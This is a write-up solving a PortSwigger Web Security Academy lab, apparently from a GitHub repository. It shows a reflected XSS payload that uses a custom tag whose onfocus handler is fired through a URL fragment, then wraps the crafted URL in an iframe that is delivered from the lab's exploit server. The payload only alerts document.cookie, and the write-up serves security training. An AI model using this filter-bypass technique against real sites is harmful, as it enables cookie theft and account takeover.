## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/82372c8d-9c1b-439a-8907-26476763643c)

## Solution:

For this first we will give this Payload to web application.

`<cyber tabindex="1"onfocus="alert(document.cookie)"id="a1">`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/e1eb66dd-040d-41f9-a039-b75ab4b01bc9)

Result-Payload incerted in web application.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/55c1eaff-59e2-4729-93a4-a9b62e0af0a0)

For triger the alert we need type the `id` in the url using `#a1`. It will trigger an alert

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/9152f461-3401-490f-ad37-e65eb033ccee)

we need to automatically alerts document.cookie.For that our exploit url is ready. `https://0a3d00b003ba63a580c1057700e60003.web-security-academy.net/?search=%3Ccyber+tabindex%3D%221%22onfocus%3D%22alert%28document.cookie%29%22id%3D%22a1%22%3E#a1`. we need to send it inside iframe

Payload will be like

`<iframe src="exploit url"></iframe>`

Now go to exploit server and give the Payload.

```
<iframe src="https://0a3d00b003ba63a580c1057700e60003.web-security-academy.net/?search=%3Ccyber+tabindex%3D%221%22onfocus%3D%22alert%28document.cookie%29%22id%3D%22a1%22%3E#a1"></iframe>
```

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/fb10547a-d26f-4977-9d8c-982123686301)

Then View exploit.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/483c8d70-9974-472b-9be9-e942c8be842c)

Then press DELIVER it to VICTIM. lab will be solved.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/af911d31-f6bd-4a58-bdf9-c47a60b05b46)

